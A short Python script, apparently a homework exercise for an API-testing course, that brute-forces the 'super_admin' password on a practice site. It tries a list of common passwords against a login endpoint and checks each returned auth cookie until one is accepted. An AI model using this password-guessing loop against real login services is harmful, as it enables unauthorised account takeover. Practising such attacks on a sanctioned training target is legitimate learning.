import requests

password = ("password", "123456", "12345678", "qwerty", "abc123", "monkey", "1234567", "letmein", "trustno1",
            "dragon", "baseball", "111111", "iloveyou", "master", "sunshine", "ashley", "bailey", "passw0rd",
            "shadow", "123123", "654321", "superman", "qazwsx", "michael", "Football", "welcome", "jesus", "ninja",
            "mustang", "password1", "123456789", "adobe123", "admin", "1234567890", "photoshop", "1234", "12345",
            "princess", "azerty", "0", "access", "696969", "batman", "1qaz2wsx", "login", "qwertyuiop", "solo",
            "starwars", "121212", "flower", "hottie", "loveme", "zaq1zaq1", "hello", "freedom", "whatever", "666666",
            "!@#$%^&*", "charlie", "aa123456", "donald", "qwerty123", "1q2w3e4r", "555555", "lovely", "7777777",
            "888888", "123qwe",)

for i in password:
    payload_login = {"login": "super_admin", "password": i}
    response1 = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data=payload_login)

    cookie_value = response1.cookies.get('auth_cookie')

    cookies = {}
    if cookie_value is not None:
        cookies.update({'auth_cookie': cookie_value})

    response2 = requests.post("https://playground.learnqa.ru/api/check_auth_cookie", cookies=cookies)

    if response2.text == "You are authorized":
        print(response2.text, "User, your password: ", i)
